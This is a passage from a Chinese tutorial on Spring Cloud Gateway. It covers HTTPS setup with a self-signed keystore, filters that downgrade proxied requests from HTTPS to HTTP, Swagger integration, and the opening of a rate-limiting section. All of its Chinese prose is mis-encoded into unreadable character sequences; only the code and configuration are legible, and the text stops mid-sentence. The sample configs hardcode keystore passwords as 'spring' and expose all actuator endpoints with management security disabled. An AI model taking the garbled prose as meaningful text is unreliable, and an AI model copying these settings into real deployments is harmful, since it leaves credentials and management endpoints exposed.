ç½‘å…³ï¼Œç»Ÿä¸€ç®¡ç†æ‰€æœ‰ API è¯·æ±‚çš„å…¥å£å’Œå‡ºå£ï¼Œæ­¤æ—¶ Spring Cloud Gateway å°±éœ€è¦æ”¯æŒ HTTPSã€‚ç”±äº Spring Cloud Gateway æ˜¯åŸºäº Spring Boot 2.0 æ„å»ºçš„ï¼Œæ‰€ä»¥åªéœ€è¦å°†ç”Ÿæˆçš„ HTTPS è¯ä¹¦æ”¾åˆ° Spring Cloud Gateway åº”ç”¨çš„ç±»è·¯å¾„ä¸‹é¢å³å¯ã€‚ HTTPS æ¡ˆä¾‹ä¸‹é¢å°†ä»‹ç»å¦‚ä½•åœ¨ Spring Cloud Gateway ä¸­ä½¿ç”¨ HTTPSï¼Œå…¶ä¸­å„ä¸ªæ¨¡å—çš„è¯´æ˜å¦‚ä¸‹ã€‚ç”±äºæœ¬æ¡ˆä¾‹æ˜¯åŸºäºä¸Šé¢çš„ â€œGateway æœåŠ¡å‘ç°çš„è·¯ç”±è§„åˆ™æ¡ˆä¾‹ â€œ æ”¹é€ è€Œæ¥çš„ï¼Œå› æ­¤ micro-service-eurekaã€micro-service-provider-1ã€micro-service-provider-2 å·¥ç¨‹é‡Œçš„é…ç½®å’Œä»£ç ä¸å†ç´¯è¿°ï¼Œç‚¹å‡»ä¸‹è½½å®Œæ•´çš„æ¡ˆä¾‹ä»£ç ã€‚ æ¨¡å— ç«¯å£ è¯´æ˜ micro-service-gateway-https N/A èšåˆçˆ¶ Maven å·¥ç¨‹ micro-service-eureka 9000 Eureka æ³¨å†Œä¸­å¿ƒ micro-service-gateway 9001 å¸¦æœ‰ HTTPS è¯ä¹¦çš„ç½‘å…³æœåŠ¡ï¼Œä½¿ç”¨ HTTPS åè®®è®¿é—® micro-service-provider-1 9002 æœåŠ¡æä¾›è€…ï¼Œä½¿ç”¨ HTTP åè®® micro-service-provider-2 9003 æœåŠ¡æä¾›è€…ï¼Œä½¿ç”¨ HTTP åè®® åˆ›å»º Micro Service Gateway å·¥ç¨‹é‡Œçš„ pom.xml é…ç½®æ–‡ä»¶ï¼š 1234567891011121314151617181920212223242526&lt;dependency&gt; &lt;groupId&gt;org.springframework.cloud&lt;/groupId&gt; &lt;artifactId&gt;spring-cloud-starter-gateway&lt;/artifactId&gt;&lt;/dependency&gt;&lt;dependency&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-starter-actuator&lt;/artifactId&gt;&lt;/dependency&gt;&lt;dependency&gt; &lt;groupId&gt;org.springframework.cloud&lt;/groupId&gt; &lt;artifactId&gt;spring-cloud-starter-netflix-eureka-client&lt;/artifactId&gt;&lt;/dependency&gt;&lt;dependency&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-starter-web&lt;/artifactId&gt; &lt;exclusions&gt; &lt;exclusion&gt; &lt;groupId&gt;org.springframework&lt;/groupId&gt; &lt;artifactId&gt;spring-webmvc&lt;/artifactId&gt; &lt;/exclusion&gt; &lt;exclusion&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-starter-tomcat&lt;/artifactId&gt; &lt;/exclusion&gt; &lt;/exclusions&gt;&lt;/dependency&gt; åˆ›å»º Micro Service Gateway å·¥ç¨‹é‡Œçš„å¯åŠ¨ä¸»ç±»ï¼š 1234567@SpringBootApplicationpublic class GatewayServerApplication { public static void main(String[] args) { SpringApplication.run(GatewayServerApplication.class, args); }} åˆ›å»º Micro Service Gateway å·¥ç¨‹é‡Œçš„ application.yml é…ç½®æ–‡ä»¶ï¼Œé€šè¿‡ key-store æŒ‡å®š HTTPS è¯ä¹¦çš„è·¯å¾„ï¼š 12345678910111213141516171819202122232425262728server: port: 9001 ssl: enabled: true key-alias: spring key-password: spring key-store: classpath:self-signed.jks key-store-type: JKS key-store-provider: SUN key-store-password: springspring: application: name: gateway-server cloud: gateway: discovery: locator: enabled: true lower-case-service-id: trueeureka: client: service-url: defaultZone: http://127.0.0.1:9000/eureka instance: instance-id: gateway-server-${server.port} prefer-ip-address: true æµ‹è¯•ç»“æœï¼š ä¾æ¬¡å¯åŠ¨ micro-service-eurekaã€micro-service-provider-1ã€micro-service-provider-2ã€micro-service-gateway åº”ç”¨ é€šè¿‡ HTTPS åè®®è®¿é—® https://127.0.0.1:9001/provider-service/provider/sayHello/Jimï¼Œä¼šå‡ºç°å¦‚ä¸‹çš„é”™è¯¯ï¼š 123456789101112131415161718io.netty.handler.ssl.NotSslRecordException: not an SSL/TLS record: 485454502f312e3120343030200d0a5472616e736665722d456e636f646 ... at io.netty.handler.ssl.SslHandler.decodeJdkCompatible(SslHandler.java:1156) [netty-handler-4.1.25.Final.jar:4.1.25.Final] at io.netty.handler.ssl.SslHandler.decode(SslHandler.java:1221) [netty-handler-4.1.25.Final.jar:4.1.25.Final] at io.netty.handler.codec.ByteToMessageDecoder.decodeRemovalReentryProtection(ByteToMessageDecoder.java:489) ~[netty-codec-4.1.25.Final.jar:4.1.25.Final] at io.netty.handler.codec.ByteToMessageDecoder.callDecode(ByteToMessageDecoder.java:428) ~[netty-codec-4.1.25.Final.jar:4.1.25.Final] at io.netty.handler.codec.ByteToMessageDecoder.channelRead(ByteToMessageDecoder.java:265) ~[netty-codec-4.1.25.Final.jar:4.1.25.Final] at io.netty.channel.AbstractChannelHandlerContext.invokeChannelRead(AbstractChannelHandlerContext.java:362) ~[netty-transport-4.1.25.Final.jar:4.1.25.Final] at io.netty.channel.AbstractChannelHandlerContext.invokeChannelRead(AbstractChannelHandlerContext.java:348) ~[netty-transport-4.1.25.Final.jar:4.1.25.Final] at io.netty.channel.AbstractChannelHandlerContext.fireChannelRead(AbstractChannelHandlerContext.java:340) ~[netty-transport-4.1.25.Final.jar:4.1.25.Final] at io.netty.channel.DefaultChannelPipeline$HeadContext.channelRead(DefaultChannelPipeline.java:1434) ~[netty-transport-4.1.25.Final.jar:4.1.25.Final] at io.netty.channel.AbstractChannelHandlerContext.invokeChannelRead(AbstractChannelHandlerContext.java:362) ~[netty-transport-4.1.25.Final.jar:4.1.25.Final] at io.netty.channel.AbstractChannelHandlerContext.invokeChannelRead(AbstractChannelHandlerContext.java:348) ~[netty-transport-4.1.25.Final.jar:4.1.25.Final] at io.netty.channel.DefaultChannelPipeline.fireChannelRead(DefaultChannelPipeline.java:965) ~[netty-transport-4.1.25.Final.jar:4.1.25.Final] at io.netty.channel.epoll.AbstractEpollStreamChannel$EpollStreamUnsafe.epollInReady(AbstractEpollStreamChannel.java:808) ~[netty-transport-native-epoll-4.1.25.Final-linux-x86_64.jar:4.1.25.Final] at io.netty.channel.epoll.EpollEventLoop.processReady(EpollEventLoop.java:408) ~[netty-transport-native-epoll-4.1.25.Final-linux-x86_64.jar:4.1.25.Final] at io.netty.channel.epoll.EpollEventLoop.run(EpollEventLoop.java:308) ~[netty-transport-native-epoll-4.1.25.Final-linux-x86_64.jar:4.1.25.Final] at io.netty.util.concurrent.SingleThreadEventExecutor$5.run(SingleThreadEventExecutor.java:884) ~[netty-common-4.1.25.Final.jar:4.1.25.Final] at java.lang.Thread.run(Thread.java:745) ~[na:1.8.0_102] HTTPS è½¬ HTTP çš„é—®é¢˜ä¸Šè¿°é”™è¯¯å‡ºç°çš„åŸå› æ˜¯é€šè¿‡ Spring Cloud Gateway è¯·æ±‚è¿›æ¥çš„åè®®æ˜¯ HTTPSï¼Œè€Œåç«¯è¢«ä»£ç†çš„æœåŠ¡æ˜¯ HTTP åè®®çš„è¯·æ±‚ï¼Œæ‰€ä»¥å½“ Gateway ç”¨ HTTPS è¯·æ±‚è½¬å‘è°ƒç”¨ HTTP åè®®çš„æœåŠ¡æ—¶ï¼Œå°±ä¼šå‡ºç° not an SSL/TLS record çš„é”™è¯¯ã€‚æœ¬è´¨ä¸Šè¿™æ˜¯ä¸€ä¸ª Spring Cloud Gateway å°† HTTPS è¯·æ±‚è½¬å‘è°ƒç”¨ HTTP æœåŠ¡çš„é—®é¢˜ã€‚ç”±äºæœåŠ¡çš„æ‹†åˆ†ï¼Œåœ¨å¾®æœåŠ¡çš„åº”ç”¨é›†ç¾¤ä¸­ä¼šå­˜åœ¨å¾ˆå¤šæœåŠ¡æä¾›è€…å’ŒæœåŠ¡æ¶ˆè´¹è€…ï¼Œè€Œè¿™äº›æœåŠ¡æä¾›è€…å’ŒæœåŠ¡æ¶ˆè´¹è€…åŸºæœ¬éƒ½æ˜¯éƒ¨ç½²åœ¨ä¼ä¸šå†…ç½‘ä¸­ï¼Œæ²¡å¿…è¦å…¨éƒ¨åŠ  HTTPS è¿›è¡Œè°ƒç”¨ã€‚å› æ­¤ Spring Cloud Gateway å¯¹å¤–çš„è¯·æ±‚æ˜¯ HTTPSï¼Œå¯¹åç«¯ä»£ç†æœåŠ¡çš„è¯·æ±‚å¯ä»¥æ˜¯ HTTPã€‚é€šè¿‡ Debug è°ƒè¯•æºç åˆ†æï¼ŒLoadBalancerClientFilter.filter() æ–¹æ³•å¦‚ä¸‹ï¼š 123456789URI uri = exchange.getRequest().getURI();String overrideScheme = null;if (schemePrefix != null) { overrideScheme = url.getScheme();}URI requestUrl = this.loadBalancer.reconstructURI(new LoadBalancerClientFilter.DelegatingServiceInstance(instance, overrideScheme), uri);log.trace("LoadBalancerClientFilter url chosen: " + requestUrl);exchange.getAttributes().put(ServerWebExchangeUtils.GATEWAY_REQUEST_URL_ATTR, requestUrl); ä»ä¸Šé¢çš„ä»£ç å¯ä»¥çœ‹å‡ºï¼ŒLoadBalancer å¯¹ HTTP è¯·æ±‚è¿›è¡Œå°è£…ï¼Œå¦‚æœä» Spring Cloud Gateway è¿›æ¥çš„è¯·æ±‚æ˜¯ HTTPSï¼Œå®ƒå°±ç”¨ HTTPS å°è£…ï¼Œå¦‚æœæ˜¯ HTTP å°±ç”¨ HTTP å°è£…ï¼Œè€Œä¸”æ²¡æœ‰é¢„ç•™ ä»»ä½•æ‰©å±•ä¿®æ”¹çš„æ¥å£ï¼Œåªèƒ½é€šè¿‡è‡ªå®šä¹‰ Global Filter çš„æ–¹å¼å¯¹å…¶ä¿®æ”¹ã€‚ä¸‹é¢ä»‹ç»ä¸¤ç§ä¿®æ”¹æ–¹æ³•ï¼Œåœ¨å®è·µä¸­ä»»é€‰å…¶ä¸­ä¸€ç§å³å¯ã€‚ å®˜æ–¹ Issues è¯´æ˜ https://github.com/spring-cloud/spring-cloud-gateway/issues/378 https://github.com/spring-cloud/spring-cloud-gateway/issues/160 ç¬¬ä¸€ç§è§£å†³æ–¹æ¡ˆåœ¨ LoadBalancerClientFilter æ‰§è¡Œä¹‹å‰å°† HTTPS ä¿®æ”¹ä¸º HTTP åè®®ï¼š 123456789101112131415161718192021222324252627282930313233343536373839@Componentpublic class HttpsToHttpFilter implements GlobalFilter, Ordered { private static final int HTTPS_TO_HTTP_FILTER_ORDER = 10099; @Override public Mono&lt;Void&gt; filter(ServerWebExchange exchange, GatewayFilterChain chain) { URI originalUri = exchange.getRequest().getURI(); ServerHttpRequest request = exchange.getRequest(); ServerHttpRequest.Builder mutate = request.mutate(); String forwardedUri = request.getURI().toString(); if (forwardedUri != null &amp;&amp; forwardedUri.startsWith("https")) { try { URI mutatedUri = new URI("http", originalUri.getUserInfo(), originalUri.getHost(), originalUri.getPort(), originalUri.getPath(), originalUri.getQuery(), originalUri.getFragment()); mutate.uri(mutatedUri); } catch (Exception e) { throw new IllegalStateException(e.getMessage(), e); } } ServerHttpRequest build = mutate.build(); return chain.filter(exchange.mutate().request(build).build()); } /** * ç”±äºLoadBalancerClientFilterçš„orderæ˜¯10100 * è¦åœ¨LoadBalancerClientFilteræ‰§è¡Œä¹‹å‰å°†Httpsä¿®æ”¹ä¸ºHttpï¼Œéœ€è¦è®¾ç½®orderä¸º10099 * @return */ @Override public int getOrder() { return HTTPS_TO_HTTP_FILTER_ORDER; }} ç¬¬äºŒç§è§£å†³æ–¹æ¡ˆåœ¨ LoadBalancerClientFilter æ‰§è¡Œä¹‹åå°† HTTPS ä¿®æ”¹ä¸º HTTPï¼Œæ‹·è´ RibbonUtils ä¸­çš„ upgradeconnection æ–¹æ³•æ¥è‡ªå®šä¹‰å…¨å±€è¿‡æ»¤å™¨ï¼š 12345678910111213141516171819202122232425262728293031323334353637@Componentpublic class HttpSchemeFilter implements GlobalFilter, Ordered { private static final int HTTPS_TO_HTTP_FILTER_ORDER = 10101; @Override public Mono&lt;Void&gt; filter(ServerWebExchange exchange, GatewayFilterChain chain) { Object uriObj = exchange.getAttributes().get(GATEWAY_REQUEST_URL_ATTR); if (uriObj != null) { URI uri = (URI) uriObj; uri = this.upgradeConnection(uri, "http"); exchange.getAttributes().put(GATEWAY_REQUEST_URL_ATTR, uri); } return chain.filter(exchange); } private URI upgradeConnection(URI uri, String scheme) { UriComponentsBuilder uriComponentsBuilder = UriComponentsBuilder.fromUri(uri).scheme(scheme); if (uri.getRawQuery() != null) { // When building the URI, UriComponentsBuilder verify the allowed characters and does not // support the \'+\' so we replace it for its equivalent \'%20\'. // See issue https://jira.spring.io/browse/SPR-10172 uriComponentsBuilder.replaceQuery(uri.getRawQuery().replace("+", "%20")); } return uriComponentsBuilder.build(true).toUri(); } /** * ç”±äºLoadBalancerClientFilterçš„orderæ˜¯10100ï¼Œæ‰€ä»¥è®¾ç½®HttpSchemeFilterçš„çš„orderæ˜¯10101 * åœ¨LoadBalancerClientFilterä¹‹åå°†httpsä¿®æ”¹ä¸ºhttp * @return */ @Override public int getOrder() { return HTTPS_TO_HTTP_FILTER_ORDER; }} Spring Cloud Gateway é›†æˆ SwaggerSwagger æ˜¯ä¸€ä¸ªå¯è§†åŒ– API æµ‹è¯•å·¥å…·ï¼Œå¯ä»¥å’Œåº”ç”¨å®Œç¾èåˆã€‚é€šè¿‡å£°æ˜æ¥å£æ³¨è§£çš„æ–¹å¼ï¼Œå¯ä»¥æ–¹ä¾¿å¿«æ·åœ°è·å– API è°ƒè¯•ç•Œé¢è¿›è¡Œæµ‹è¯•ã€‚Zuul å¯ä»¥å¾ˆæ–¹ä¾¿åœ°ä¸ Swagger æ•´åˆåœ¨ä¸€èµ·ï¼Œç”±äº Spring Cloud Finchley ç‰ˆæ˜¯åŸºäº Spring Boot 2.0 çš„ï¼Œè€Œ Spring Cloud Gateway çš„åº•å±‚æ˜¯åŸºäº WebFlux å®ç°çš„ï¼Œä¸”ç»éªŒè¯ï¼ŒWebFlux å’Œ Swagger ä¸å…¼å®¹ã€‚å¦‚æœæŒ‰ç…§ Zuul é›†æˆ Swagger çš„æ–¹å¼ï¼Œåº”ç”¨å¯åŠ¨çš„æ—¶å€™ä¼šæŠ¥é”™ã€‚ä¸‹é¢å°†ä»‹ç» Spring Cloud Gateway å¦‚ä½•é›†æˆ Swaggerï¼Œå…¶ä¸­å„ä¸ªæ¨¡å—çš„è¯´æ˜å¦‚ä¸‹ã€‚ç”±äºæœ¬æ¡ˆä¾‹æ˜¯åŸºäºä¸Šé¢çš„ â€œGateway æœåŠ¡å‘ç°çš„è·¯ç”±è§„åˆ™æ¡ˆä¾‹ â€œ æ”¹é€ è€Œæ¥çš„ï¼Œå› æ­¤ micro-service-eureka å·¥ç¨‹é‡Œçš„é…ç½®å’Œä»£ç ä¸å†ç´¯è¿°ï¼Œç‚¹å‡»ä¸‹è½½å®Œæ•´çš„æ¡ˆä¾‹ä»£ç ã€‚ æ¨¡å— ç«¯å£ è¯´æ˜ micro-service-gateway-swagger N/A èšåˆçˆ¶ Maven å·¥ç¨‹ micro-service-eureka 9000 Eureka æ³¨å†Œä¸­å¿ƒ micro-service-gateway 9001 åŸºäº Spring Cloud Gateway çš„ç½‘å…³æœåŠ¡ micro-service-provider-1 9002 æœåŠ¡æä¾›è€… micro-service-provider-2 9003 æœåŠ¡æä¾›è€… 1. åˆ›å»º Micro Service Gateway å·¥ç¨‹åˆ›å»º Micro Service Gateway å·¥ç¨‹é‡Œçš„ pom.xml é…ç½®æ–‡ä»¶ï¼š 123456789101112131415161718192021222324252627282930313233343536&lt;dependency&gt; &lt;groupId&gt;org.springframework.cloud&lt;/groupId&gt; &lt;artifactId&gt;spring-cloud-starter-gateway&lt;/artifactId&gt;&lt;/dependency&gt;&lt;dependency&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-starter-actuator&lt;/artifactId&gt;&lt;/dependency&gt;&lt;dependency&gt; &lt;groupId&gt;org.springframework.cloud&lt;/groupId&gt; &lt;artifactId&gt;spring-cloud-starter-netflix-eureka-client&lt;/artifactId&gt;&lt;/dependency&gt;&lt;dependency&gt; &lt;groupId&gt;io.springfox&lt;/groupId&gt; &lt;artifactId&gt;springfox-swagger-ui&lt;/artifactId&gt; &lt;version&gt;2.9.2&lt;/version&gt;&lt;/dependency&gt;&lt;dependency&gt; &lt;groupId&gt;io.springfox&lt;/groupId&gt; &lt;artifactId&gt;springfox-swagger2&lt;/artifactId&gt; &lt;version&gt;2.9.2&lt;/version&gt;&lt;/dependency&gt;&lt;dependency&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-starter-web&lt;/artifactId&gt; &lt;exclusions&gt; &lt;exclusion&gt; &lt;groupId&gt;org.springframework&lt;/groupId&gt; &lt;artifactId&gt;spring-webmvc&lt;/artifactId&gt; &lt;/exclusion&gt; &lt;exclusion&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-starter-tomcat&lt;/artifactId&gt; &lt;/exclusion&gt; &lt;/exclusions&gt;&lt;/dependency&gt; åˆ›å»º Micro Service Gateway å·¥ç¨‹é‡Œçš„ SwaggerProvider ç±»ï¼Œå› ä¸º Swagger æš‚ä¸æ”¯æŒ WebFlux é¡¹ç›®ï¼Œæ‰€ä»¥ä¸èƒ½åœ¨ Gateway ä¸­é…ç½® SwaggerCoufigï¼Œéœ€è¦ç¼–å†™ GatewaySwaggerProvider å®ç° SwaggerResourcesProvider æ¥å£ï¼Œç”¨äºè·å– SwaggerResourcesï¼š 12345678910111213141516171819202122232425262728293031323334353637383940/** * @Primaryæ³¨è§£çš„å®ä¾‹ä¼˜å…ˆäºå…¶ä»–å®ä¾‹è¢«æ³¨å…¥ */@Primary@Componentpublic class GatewaySwaggerProvider implements SwaggerResourcesProvider { private final RouteLocator routeLocator; private final GatewayProperties gatewayProperties; public static final String API_URI = "/v2/api-docs"; public GatewaySwaggerProvider(RouteLocator routeLocator, GatewayProperties gatewayProperties) { this.routeLocator = routeLocator; this.gatewayProperties = gatewayProperties; } @Override public List&lt;SwaggerResource&gt; get() { List&lt;SwaggerResource&gt; resources = new ArrayList&lt;&gt;(); List&lt;String&gt; routes = new ArrayList&lt;&gt;(); //å–å‡ºSpring Cloud Gatewayä¸­çš„route routeLocator.getRoutes().subscribe(route -&gt; routes.add(route.getId())); //ç»“åˆapplication.ymlä¸­çš„è·¯ç”±é…ç½®ï¼Œåªè·å–æœ‰æ•ˆçš„routeèŠ‚ç‚¹ gatewayProperties.getRoutes().stream().filter(routeDefinition -&gt; routes.contains(routeDefinition.getId())) .forEach(routeDefinition -&gt; routeDefinition.getPredicates().stream() .filter(predicateDefinition -&gt; ("Path").equalsIgnoreCase(predicateDefinition.getName())) .forEach(predicateDefinition -&gt; resources.add(swaggerResource(routeDefinition.getId(), predicateDefinition.getArgs().get(NameUtils.GENERATED_NAME_PREFIX + "0") .replace("/**", API_URI))))); return resources; } private SwaggerResource swaggerResource(String name, String location) { SwaggerResource swaggerResource = new SwaggerResource(); swaggerResource.setName(name); swaggerResource.setLocation(location); swaggerResource.setSwaggerVersion("2.0"); return swaggerResource; }} åˆ›å»º Micro Service Gateway å·¥ç¨‹é‡Œçš„ Swagger-Resource ç«¯ç‚¹ï¼Œå› ä¸ºæ²¡æœ‰åœ¨ Gateway ä¸­é…ç½® SwaggerConfigï¼Œä½†æ˜¯è¿è¡Œ Swagger-UI çš„æ—¶å€™éœ€è¦ä¾èµ–ä¸€äº›æ¥å£ï¼Œæ‰€ä»¥éœ€è¦å»ºç«‹ç›¸åº”çš„ Swagger-Resource ç«¯ç‚¹ï¼š 123456789101112131415161718192021222324252627282930313233@RestController@RequestMapping("/swagger-resources")public class SwaggerHandler { @Autowired(required = false) private SecurityConfiguration securityConfiguration; @Autowired(required = false) private UiConfiguration uiConfiguration; private final SwaggerResourcesProvider swaggerResources; @Autowired public SwaggerHandler(SwaggerResourcesProvider swaggerResources) { this.swaggerResources = swaggerResources; } @GetMapping("/configuration/security") public Mono&lt;ResponseEntity&lt;SecurityConfiguration&gt;&gt; securityConfiguration() { return Mono.just(new ResponseEntity&lt;&gt;( Optional.ofNullable(securityConfiguration).orElse(SecurityConfigurationBuilder.builder().build()), HttpStatus.OK)); } @GetMapping("/configuration/ui") public Mono&lt;ResponseEntity&lt;UiConfiguration&gt;&gt; uiConfiguration() { return Mono.just(new ResponseEntity&lt;&gt;( Optional.ofNullable(uiConfiguration).orElse(UiConfigurationBuilder.builder().build()), HttpStatus.OK)); } @GetMapping("") public Mono&lt;ResponseEntity&gt; swaggerResources() { return Mono.just((new ResponseEntity&lt;&gt;(swaggerResources.get(), HttpStatus.OK))); }} åˆ›å»º Micro Service Gateway å·¥ç¨‹é‡Œçš„ GwSwaggerHeaderFilter ç±»ï¼Œç”±äºåœ¨è·¯ç”±è§„åˆ™ä¸º admin/test/{a}/{b} æ—¶ï¼ŒSwagger ç•Œé¢ä¸Šä¼šæ˜¾ç¤ºä¸º test/{a}/{b}ï¼Œç¼ºå°‘äº† /admin è¿™ä¸ªè·¯ç”±èŠ‚ç‚¹ã€‚é€šè¿‡ Debug æ–­ç‚¹è°ƒè¯•å‘ç°ï¼ŒSwagger ä¼šæ ¹æ® X-Forwarded-Prefix è¿™ä¸ª Header æ¥è·å– BasePathï¼Œå› æ­¤éœ€è¦å°†å®ƒæ·»åŠ åˆ°æ¥å£è·¯å¾„ä¸ Host ä¹‹é—´æ‰èƒ½æ­£å¸¸å·¥ä½œã€‚ä½†æ˜¯ Gateway åœ¨åšè½¬å‘çš„æ—¶å€™å¹¶æ²¡æœ‰å°†è¿™ä¸ª Header æ·»åŠ åˆ° Request ä¸Šï¼Œä»è€Œå¯¼è‡´æ¥å£è°ƒè¯•å‡ºç° 404 é”™è¯¯ã€‚ä¸ºäº†è§£å†³è¯¥é—®é¢˜ï¼Œéœ€è¦åœ¨ Gateway ä¸­ç¼–å†™ä¸€ä¸ªè¿‡æ»¤å™¨æ¥æ·»åŠ è¿™ä¸ª Headerã€‚ç‰¹åˆ«æ³¨æ„ï¼ŒSpring Boot ç‰ˆæœ¬ä¸º 2.0.6 ä»¥ä¸Šçš„å¯ä»¥è·³è¿‡è¿™ä¸€æ­¥éª¤ï¼Œæœ€æ–°æºç é‡Œ Spring Boot ä¿®å¤äº†è¯¥ Bugï¼Œå·²ç»é»˜è®¤æ·»åŠ ä¸Šäº†è¿™ä¸ª Headerã€‚ 1234567891011121314151617181920@Componentpublic class GwSwaggerHeaderFilter extends AbstractGatewayFilterFactory { private static final String HEADER_NAME = "X-Forwarded-Prefix"; @Override public GatewayFilter apply(Object config) { return (exchange, chain) -&gt; { ServerHttpRequest request = exchange.getRequest(); String path = request.getURI().getPath(); if (!StringUtils.endsWithIgnoreCase(path, GatewaySwaggerProvider.API_URI)) { return chain.filter(exchange); } String basePath = path.substring(0, path.lastIndexOf(GatewaySwaggerProvider.API_URI)); ServerHttpRequest newRequest = request.mutate().header(HEADER_NAME, basePath).build(); ServerWebExchange newExchange = exchange.mutate().request(newRequest).build(); return chain.filter(newExchange); }; }} åˆ›å»º Micro Service Gateway å·¥ç¨‹é‡Œçš„ application.yml é…ç½®æ–‡ä»¶ï¼Œæ·»åŠ ä¸Šé¢ç¼–å†™çš„ GwSwaggerHeaderFilter è¿‡æ»¤å™¨ï¼Œ URI æŒ‡å®šä¸º lb://provider-service-1ï¼Œè¡¨ç¤ºè´Ÿè½½å‡è¡¡åˆ° provider-service-1 æœåŠ¡ã€‚ç”±äº Swagger å‘å‡ºè¯·æ±‚ çš„ URL éƒ½æ˜¯ä»¥ /xxxx å¼€å¤´ï¼Œå› æ­¤éœ€è¦ä½¿ç”¨ StripPrefix è¿‡æ»¤å™¨å°†ç¬¬ä¸€ä¸ªè·¯ç”±èŠ‚ç‚¹ï¼ˆ/xxxxï¼‰å»æ‰ã€‚ 12345678910111213141516171819202122232425262728293031323334353637383940414243server: port: 9001spring: application: name: gateway-server cloud: gateway: discovery: locator: enabled: true lower-case-service-id: true routes: - id: provider-service-1 uri: lb://provider-service-1 predicates: - Path=/provider1/** filters: - GwSwaggerHeaderFilter - StripPrefix=1 - id: provider-service-2 uri: lb://provider-service-2 predicates: - Path=/provider2/** filters: - GwSwaggerHeaderFilter - StripPrefix=1eureka: client: service-url: defaultZone: http://127.0.0.1:9000/eureka instance: instance-id: gateway-server-${server.port} prefer-ip-address: truemanagement: endpoints: web: exposure: include: \'*\' security: enabled: false 2. åˆ›å»º Micro Service Provider 1 å·¥ç¨‹åˆ›å»º Micro Service Provider 1 å·¥ç¨‹é‡Œçš„ pom.xml é…ç½®æ–‡ä»¶ï¼š 1234567891011121314&lt;dependency&gt; &lt;groupId&gt;org.springframework.cloud&lt;/groupId&gt; &lt;artifactId&gt;spring-cloud-starter-netflix-eureka-client&lt;/artifactId&gt;&lt;/dependency&gt;&lt;dependency&gt; &lt;groupId&gt;io.springfox&lt;/groupId&gt; &lt;artifactId&gt;springfox-swagger-ui&lt;/artifactId&gt; &lt;version&gt;2.9.2&lt;/version&gt;&lt;/dependency&gt;&lt;dependency&gt; &lt;groupId&gt;io.springfox&lt;/groupId&gt; &lt;artifactId&gt;springfox-swagger2&lt;/artifactId&gt; &lt;version&gt;2.9.2&lt;/version&gt;&lt;/dependency&gt; åˆ›å»º Micro Service Provider 1 å·¥ç¨‹é‡Œçš„ SwaggerConfig ç±»ï¼š 1234567891011121314151617181920212223@Configuration@EnableSwagger2public class SwaggerConfig { @Bean public Docket createRestApi() { return new Docket(DocumentationType.SWAGGER_2) .apiInfo(apiInfo()) .select() .apis(RequestHandlerSelectors.withMethodAnnotation(ApiOperation.class)) .paths(PathSelectors.any()) .build(); } private ApiInfo apiInfo() { return new ApiInfoBuilder() .title("Swagger API") .description("éªŒè¯ Gateway é›†æˆ Swagger çš„æ•ˆæœ") .termsOfServiceUrl("") .version("2.0") .build(); }} åˆ›å»º Micro Service Provider 1 å·¥ç¨‹é‡Œçš„æµ‹è¯•æ§åˆ¶ç±»ï¼š 123456789101112131415@RestController@Api("provider-service-1 æ¥å£æµ‹è¯•")@RequestMapping("/provider1")public class ProviderOneController { @ApiOperation(value = "è®¡ç®—+", notes = "åŠ æ³•") @ApiImplicitParams({ @ApiImplicitParam(name = "a", value = "æ•°å­—a", required = true, dataType = "Long"), @ApiImplicitParam(name = "b", value = "æ•°å­—b", required = true, dataType = "Long") }) @GetMapping("/{a}/{b}") public String get(@PathVariable Integer a, @PathVariable Integer b) { return "from provider service 1, the result is: " + (a + b); }} åˆ›å»º Micro Service Provider 1 å·¥ç¨‹é‡Œçš„ application.xml é…ç½®æ–‡ä»¶ï¼š 1234567891011121314server: port: 9002spring: application: name: provider-service-1eureka: client: service-url: defaultZone: http://127.0.0.1:9000/eureka instance: instance-id: provider-service-1-${server.port} prefer-ip-address: true 3. åˆ›å»º Micro Service Provider 2 å·¥ç¨‹ç”±äº Micro Service Provider 2 å·¥ç¨‹ ä¸ Micro Service Provider 1 å·¥ç¨‹é‡Œçš„é…ç½®å’Œä»£ç éƒ½å·®ä¸å¤šï¼Œè¿™é‡Œä¸å†ç´¯è¿°ã€‚ 4. æµ‹è¯•ç»“æœ ä¾æ¬¡å¯åŠ¨ micro-service-eurekaã€micro-service-provider-1ã€micro-service-provider-2ã€micro-service-gateway åº”ç”¨ è®¿é—® http://127.0.0.1:9000/ï¼ŒæŸ¥çœ‹å„ä¸ªæœåŠ¡æ˜¯å¦éƒ½æˆåŠŸæ³¨å†Œåˆ° Eureka è®¿é—® http://127.0.0.1:9001/swagger-ui.htmlï¼ŒæŸ¥çœ‹ Swagger çš„ç•Œé¢æ˜¯å¦æ­£å¸¸å·¥ä½œï¼ŒæŸ¥çœ‹æˆªå›¾ åœ¨ Swagger çš„ç•Œé¢ä¸Šæ‰“å¼€å¯¹åº”çš„ URLï¼Œè¾“å…¥æµ‹è¯•æ•°æ®ï¼ŒéªŒè¯ Swagger ç»è¿‡ Gateway æ˜¯å¦å¯ä»¥æ­£å¸¸è®¿é—® Provider1 å’Œ Provider2 æœåŠ¡çš„æ¥å£ï¼ŒæŸ¥çœ‹æˆªå›¾ Spring Cloud Gateway é™æµé™æµæ¦‚è¿°åœ¨å¼€å‘é«˜å¹¶å‘ç³»ç»Ÿæ—¶å¯ä»¥ç”¨ä¸‰æŠŠåˆ©å™¨æ¥ä¿æŠ¤ç³»ç»Ÿï¼šç¼“å­˜ã€é™çº§å’Œé™æµã€‚ç¼“å­˜çš„ç›®çš„æ˜¯æå‡ç³»ç»Ÿè®¿é—®é€Ÿåº¦å’Œå¢å¤§ç³»ç»Ÿå¤„ç†çš„å®¹é‡ï¼Œæ˜¯æŠ—é«˜å¹¶å‘æµé‡çš„ â€œé“¶å¼¹â€ï¼›è€Œé™çº§æ˜¯å½“æœåŠ¡å‡ºç°é—®é¢˜æˆ–è€…å½±å“åˆ°æ 